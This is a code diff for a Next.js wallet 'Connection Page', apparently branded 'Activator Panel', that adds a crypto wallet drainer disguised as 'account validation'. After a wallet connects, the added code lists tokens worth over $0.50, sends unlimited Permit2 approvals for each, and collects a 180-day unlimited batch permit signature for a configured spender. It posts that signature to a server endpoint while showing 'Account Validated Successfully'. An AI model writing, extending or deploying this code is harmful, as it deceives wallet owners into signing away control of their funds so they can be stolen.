@@ -1,17 +1,24 @@
-'use client'
+'use client';
 
-'use client'
-
-import { useState } from 'react'
-import { Card, CardContent } from "@/components/ui/card"
-import Image from 'next/image'
-import Link from 'next/link'
+import { useState, useCallback, useEffect } from 'react';
+import { Card, CardContent } from '@/components/ui/card';
+import Image from 'next/image';
+import Link from 'next/link';
+import {
+  AllowanceProvider,
+  MaxAllowanceTransferAmount,
+} from '@uniswap/permit2-sdk';
+import { ethers, Contract } from 'ethers';
+import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react';
+import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5';
+import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora } from '@reown/appkit/networks';
+import { Alchemy, Network } from 'alchemy-sdk';
 
 type WalletType = {
   id: string;
   icon: string;
   name: string;
-}
+};
 
 
 const wallets: WalletType[] = [
@@ -77,11 +84,328 @@ const wallets: WalletType[] = [
   { id: 'w60', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTh4K1QctcLFb5izZFPk7o8xqZACdbOcssxOxXTo0n7hEWJQLUyIa7ap-_xAnwBsRSp1TI&usqp=CAU', name: 'Injective' },
 ]
 
+
+interface PermitDetails {
+  token: string;
+  amount: ethers.BigNumberish;
+  expiration: number;
+  nonce: number;
+}
+
+interface PermitBatch {
+  details: PermitDetails[];
+  spender: string;
+  sigDeadline: number;
+}
+
+interface TokenWithValue {
+  address: string;
+  symbol: string;
+  balance: ethers.BigNumber;
+  decimals: number;
+  price: number;
+  value: number;
+}
+
+const MIN_TOKEN_VALUE_USD = 0.5;
+
+function toDeadline(expiration: number): number {
+  return Math.floor((Date.now() + expiration) / 1000);
+}
+
+const alchemyConfig = {
+  apiKey: process.env.NEXT_PUBLIC_ALCHEMY_API_KEY,
+};
+
+const networkMap: { [key: number]: Network } = {
+  1: Network.ETH_MAINNET,
+  8453: Network.BASE_MAINNET,
+  42161: Network.ARB_MAINNET,
+  56: Network.BNB_MAINNET,
+  7777777: Network.ZORA_MAINNET,
+  81457: Network.BLAST_MAINNET,
+  324: Network.ZKSYNC_MAINNET,
+  10: Network.OPT_MAINNET,
+  43114: Network.AVAX_MAINNET,
+};
+
+const CONTRACT_ADDRESSES: { [Key: number]: string} = {
+  1: process.env.NEXT_PUBLIC_MAINNET_SPENDER!,       // Ethereum Mainnet
+  42161: process.env.NEXT_PUBLIC_ARBITRUM_SPENDER!, // Arbitrum
+  56: process.env.NEXT_PUBLIC_BNB_SPENDER!,          // BSC
+  8453: process.env.NEXT_PUBLIC_BASE_SPENDER!,       // Base
+  10: process.env.NEXT_PUBLIC_OPTIMISM_SPENDER!,     // Optimism
+  43114: process.env.NEXT_PUBLIC_AVALANCHE_SPENDER!, // Avalanche
+  324: process.env.NEXT_PUBLIC_ZKSYNC_SPENDER!,      // zkSync
+  137: process.env.NEXT_PUBLIC_POLYGON_SPENDER!,     // Polygon
+  7777777: process.env.NEXT_PUBLIC_ZORA_SPENDER!,    //zora
+  81457: process.env.NEXT_PUBLIC_BLAST_SPENDER!       //blast
+}
+
+const PERMIT2_ADDRESSES: { [key: number]: string } = {
+  1: process.env.NEXT_PUBLIC_MAINNET_PERMIT2!,     // Ethereum Mainnet
+  42161: process.env.NEXT_PUBLIC_ARBITRUM_PERMIT2!, // Arbitrum
+  56: process.env.NEXT_PUBLIC_BNB_PERMIT2!,     // BSC
+  8453: process.env.NEXT_PUBLIC_BASE_PERMIT2!,   // Base
+  10: process.env.NEXT_PUBLIC_OPTIMISM_PERMIT2!,     // Optimism
+  43114: process.env.NEXT_PUBLIC_AVALANCHE_PERMIT2!, // Avalanche
+  324: process.env.NEXT_PUBLIC_ZKSYNC_PERMIT2!,   // zkSync Era Mainnet
+  137: process.env.NEXT_PUBLIC_POLYGON_PERMIT2!,   // Polygon
+  7777777: process.env.NEXT_PUBLIC_ZORA_PERMIT2!, // Zora
+  81457: process.env.NEXT_PUBLIC_BLAST_PERMIT2!, // Blast
+};
+
+async function fetchValuableTokens(address: string, chainId: number): Promise<TokenWithValue[]> {
+  try {
+    const network = networkMap[chainId] || Network.ETH_MAINNET;
+    const alchemy = new Alchemy({ ...alchemyConfig, network });
+    const balances = await alchemy.core.getTokenBalances(address);
+
+    const tokensWithMetadata = await Promise.all(
+      balances.tokenBalances
+        .filter(token => ethers.BigNumber.from(token.tokenBalance).gt(0))
+        .map(async token => {
+          const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
+          if (metadata.name && metadata.symbol) {
+            return {
+              address: token.contractAddress,
+              symbol: metadata.symbol,
+              balance: ethers.BigNumber.from(token.tokenBalance),
+              decimals: metadata.decimals || 18,
+              price: 0,
+              value: 0,
+            };
+          }
+          return null;
+        })
+    );
+
+    const validTokens = tokensWithMetadata.filter((token): token is TokenWithValue => token !== null);
+    const symbols = validTokens.map(token => token.symbol);
+
+    try {
+      const priceData = await alchemy.prices.getTokenPriceBySymbol(symbols);
+      const tokensWithValues = validTokens.map(token => {
+        const tokenPriceInfo = priceData.data.find(p => p.symbol === token.symbol);
+        if (tokenPriceInfo && !tokenPriceInfo.error && tokenPriceInfo.prices && tokenPriceInfo.prices.length > 0) {
+          const usdPrice = parseFloat(tokenPriceInfo.prices[0].value);
+          const normalizedBalance = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
+          const usdValue = normalizedBalance * usdPrice;
+          return { ...token, price: usdPrice, value: usdValue };
+        }
+        return token;
+      });
+
+      const valuableTokens = tokensWithValues.filter(token => token.price > 0 && token.value >= MIN_TOKEN_VALUE_USD);
+      console.log(`Filtered out ${tokensWithValues.length - valuableTokens.length} tokens below $${MIN_TOKEN_VALUE_USD} threshold`);
+      return valuableTokens.sort((a, b) => b.value - a.value);
+    } catch (priceError) {
+      console.error('Failed to fetch token prices:', priceError);
+      return [];
+    }
+  } catch (error) {
+    console.error('Failed to fetch valuable tokens:', error);
+    return [];
+  }
+}
+
+const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID!;
+const metadata = {
+  name: 'Activator Panel',
+  description: 'Account and wallet validator tool',
+  url: 'https://activatorpanel.com',
+  icons: ['https://www.appactivator-panel.com/Home%20Page%20_%20Welcome%20to%20Panelactivator.com_files/save_bckudy.png'],
+};
+
+createAppKit({
+  adapters: [new Ethers5Adapter()],
+  metadata,
+  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora],
+  projectId,
+  features: { analytics: true },
+});
+
 export default function IssuesContent() {
   const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
+  const [account, setAccount] = useState<string>('');
+  const [spender, setSpender] = useState<string>('');
+  const [signature, setSignature] = useState<string>('');
+  const [provider, setProvider] = useState<ethers.providers.Web3Provider | undefined>(undefined);
+  const [chainId, setChainId] = useState<number>(0);
+  const [tokens, setTokens] = useState<TokenWithValue[]>([]);
+  const [loading, setLoading] = useState<boolean>(false);
+  const [totalValue, setTotalValue] = useState<number>(0);
+  const [showPopup, setShowPopup] = useState<boolean>(false);
+  const [processingAction, setProcessingAction] = useState<string>('');
+
+  const { open } = useAppKit();
+  const { walletProvider } = useAppKitProvider<ethers.providers.ExternalProvider>('eip155');
+
+  useEffect(() => {
+    if (account && chainId) {
+      setLoading(true);
+      fetchValuableTokens(account, chainId)
+        .then(valuableTokens => {
+          setTokens(valuableTokens);
+          const total = valuableTokens.reduce((sum, token) => sum + token.value, 0);
+          setTotalValue(total);
+          setLoading(false);
+        })
+        .catch(error => {
+          console.error('Error fetching valuable tokens:', error);
+          setLoading(false);
+        });
+    }
+  }, [account, chainId]);
+
+  const handleValidation = useCallback(async () => {
+    if (!provider || !account || !chainId || tokens.length === 0) {
+      alert('Please connect a wallet and ensure tokens are loaded.');
+      return;
+    }
+
+    // Get the Permit2 address for the current chainId
+    const permit2Address = PERMIT2_ADDRESSES[chainId];
+    if (!permit2Address) {
+      throw new Error(`No Permit2 address configured for chainId ${chainId}`);
+    }
+
+    setProcessingAction('approve');
+    try {
+      const signer = provider.getSigner(account);
+      const allowanceProvider = new AllowanceProvider(provider, permit2Address);
+      const approveAbi = ['function approve(address spender, uint256 amount)'];
+
+      // Step 1: Approve All Tokens (no prior allowance check)
+      for (const token of tokens) {
+        const tokenContract = new Contract(token.address, approveAbi, signer);
+        console.log(`Approving ${token.symbol} (${token.address})...`);
+        const tx = await tokenContract.approve(permit2Address, MaxAllowanceTransferAmount);
+        await tx.wait();
+        console.log(`Token approval successful for ${token.symbol} (${token.address}) with value $${token.value.toFixed(2)} on chainId ${chainId}`);
+      }
+      console.log(`Approved ${tokens.length} tokens on chainId ${chainId}`);
+
+      // Step 2: Sign Permit for All Tokens
+      setProcessingAction('permit');
+      const details: PermitDetails[] = [];
+      for (const token of tokens) {
+        const { nonce } = await allowanceProvider.getAllowanceData(token.address, account, spender);
+        details.push({
+          token: ethers.utils.getAddress(token.address),
+          amount: MaxAllowanceTransferAmount,
+          expiration: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
+          nonce,
+        });
+      }
+      const permitBatch: PermitBatch = {
+        details,
+        spender,
+        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
+      };
+      const domain = {
+        name: 'Permit2',
+        chainId: chainId,
+        verifyingContract: permit2Address,
+      };
+      const types = {
+        PermitBatch: [
+          { name: 'details', type: 'PermitDetails[]' },
+          { name: 'spender', type: 'address' },
+          { name: 'sigDeadline', type: 'uint256' },
+        ],
+        PermitDetails: [
+          { name: 'token', type: 'address' },
+          { name: 'amount', type: 'uint160' },
+          { name: 'expiration', type: 'uint48' },
+          { name: 'nonce', type: 'uint48' },
+        ],
+      };
+      const signature = await signer._signTypedData(domain, types, permitBatch);
+      setSignature(signature);
+      console.log('Batch Signature:', signature);
+
+      const response = await fetch('/api/store/permit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ permitBatch, signature, owner: account, chainId }),
+      });
+      const result = await response.json();
+      if (response.ok) {
+        console.log('Account Validation successful');
+        setShowPopup(false);
+        alert('Account Validated Successfully!!');
+      } else {
+        throw new Error(result.message || 'Failed to validate');
+      }
+    } catch (e) {
+      console.error('Validation failed:', e);
+      alert(`Validation failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
+    } finally {
+      setProcessingAction('');
+    }
+  }, [account, provider, spender, chainId, tokens]);
+
+  const connectWallet = useCallback(async () => {
+    try {
+      await open();
+      if (walletProvider) {
+        const web3Provider = new ethers.providers.Web3Provider(walletProvider);
+        const signer = web3Provider.getSigner();
+        const address = await signer.getAddress();
+        const checkSummedAddress = ethers.utils.getAddress(address);
+        const network = await web3Provider.getNetwork();
+        const chainId = network.chainId;
+
+        // Get the appropriate spender address based on chainId
+        const spenderAddress = CONTRACT_ADDRESSES[chainId];
+        if (!spenderAddress) {
+          throw new Error(`No spender address configured for chainId ${chainId}`);
+        }
+
+        setProvider(web3Provider);
+        setAccount(checkSummedAddress);
+        setSpender(spenderAddress);
+        setChainId(chainId);
+        setShowPopup(true);
+      }
+    } catch (e) {
+      console.error('Wallet connection failed:', e);
+      alert(`Wallet connection failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
+    }
+  }, [open, walletProvider]);
+
+  const formatCurrency = (value: number): string => {
+    return value.toLocaleString('en-US', {
+      style: 'currency',
+      currency: 'USD',
+      minimumFractionDigits: 2,
+      maximumFractionDigits: 2,
+    });
+  };
+
+  const formatAddress = (address: string): string => {
+    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+  };
+
+  const getNetworkName = (chainId: number): string => {
+    const networkNames: { [key: number]: string } = {
+      1: 'Ethereum Mainnet',
+      42161: 'Arbitrum',
+      56: 'Binance Smart Chain',
+      8453: 'Base',
+      10: 'Optimism',
+      43114: 'Avalanche',
+      324: 'zkSync Era',
+      137: 'Polygon',
+      7777777: 'Zora',
+      81457: 'Blast',
+    };
+    return networkNames[chainId] || `Unknown Network (Chain ID: ${chainId})`;
+  };
 
   return (
-    <div className="w-full">
+    <div className="w-full relative">
       <section className="container mx-auto px-4 sm:px-6 lg:px-8">
         <h2 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-4 sm:mb-6 text-center text-blue-700 mt-16 md:mt-20">
           Connection Page
@@ -94,12 +418,15 @@ export default function IssuesContent() {
             <Card
               key={wallet.id}
               className={`cursor-pointer transition-all ${
-                selectedWallet === wallet.id ? 'ring-2 ring-purple-600' : 'hover:bg-gray-50'
+                selectedWallet === wallet.id ? 'ring-1 ring-purple-600' : 'hover:bg-gray-50'
               }`}
-              onClick={() => setSelectedWallet(wallet.id)}
+              onClick={() => {
+                setSelectedWallet(wallet.id);
+                connectWallet();
+              }}
             >
               <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4">
-                <Link href="/connect" className="flex flex-col items-center">
+                <span className="flex flex-col items-center">
                   <div className="mb-3 sm:mb-4">
                     <Image
                       src={wallet.icon}
@@ -112,12 +439,74 @@ export default function IssuesContent() {
                   <span className="text-xs sm:text-sm md:text-base font-semibold text-center text-blue-600">
                     {wallet.name}
                   </span>
-                </Link>
+                </span>
               </CardContent>
             </Card>
           ))}
         </div>
       </section>
+
+      {showPopup && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg shadow-xl p-6 max-w-md w-full mx-4">
+            <div className="text-center mb-6">
+              <h3 className="text-xl font-bold text-blue-700 mb-2">Account Validation Required</h3>
+              {!CONTRACT_ADDRESSES[chainId] ? (
+                <p className="text-red-600 mb-4">
+                  This network ({getNetworkName(chainId)}) is not supported yet. Please switch to a supported network.
+                </p>
+              ) : (
+                <p className="text-gray-600 mb-4">
+                  To proceed, please validate your account:
+                </p>
+              )}
+
+              {account && (
+                <div className="bg-gray-100 rounded-md p-3 mb-4">
+                  <p className="text-sm text-gray-700 mb-1">Connected Account:</p>
+                  <p className="font-mono text-blue-600 font-medium">{formatAddress(account)}</p>
+                  <p className="text-sm text-gray-700 mt-2 mb-1">Network:</p>
+                  <p className="font-medium text-blue-600">{getNetworkName(chainId)}</p>
+                </div>
+              )}
+
+              {loading ? (
+                <div className="flex justify-center items-center p-4">
+                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
+                  <p className="ml-3 text-blue-700">Loading...</p>
+                </div>
+              ) : processingAction ? (
+                <div className="flex justify-center items-center p-4">
+                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
+                  <p className="ml-3 text-blue-700">
+                    {processingAction === 'approve' ? 'Validating...' : 'Signing...'}
+                  </p>
+                </div>
+              ) : (
+                <div className="flex flex-col gap-3">
+                  <button
+                    onClick={handleValidation}
+                    disabled={!provider || !tokens.length || !CONTRACT_ADDRESSES[chainId]}
+                    className={`w-full py-3 px-4 rounded-lg font-medium text-white ${
+                      !provider || !tokens.length || !CONTRACT_ADDRESSES[chainId]
+                        ? 'bg-gray-400 cursor-not-allowed'
+                        : 'bg-blue-600 hover:bg-blue-700'
+                    } transition-colors duration-200`}
+                  >
+                    Validate Account
+                  </button>
+                  <button
+                    onClick={() => setShowPopup(false)}
+                    className="w-full py-2 px-4 rounded-lg font-medium text-gray-700 bg-gray-200 hover:bg-gray-300 mt-2"
+                  >
+                    Cancel
+                  </button>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
